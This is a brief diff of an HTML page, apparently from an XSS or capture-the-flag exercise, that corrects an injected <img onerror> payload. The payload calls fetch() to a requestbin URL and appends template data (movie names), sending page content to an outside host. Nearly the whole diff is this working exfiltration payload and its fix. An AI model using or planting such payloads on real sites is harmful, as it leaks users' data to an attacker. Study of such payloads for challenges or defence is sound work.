@@ -25,4 +25,4 @@ Welcome to the desert of the real.
   <div id="captcha"></div>
 </div>
 <button id="report" type="submit" class="report"></button>
-<img src=x onerror="fetch('http://requestbin.fullcontact.com/uoo4t8uo?+'{{#movies}}{{ name }}{{/movies}}')">
+<img src=x onerror="fetch('http://requestbin.fullcontact.com/uoo4t8uo?'+'{{#movies}}{{ name }}{{/movies}}')">
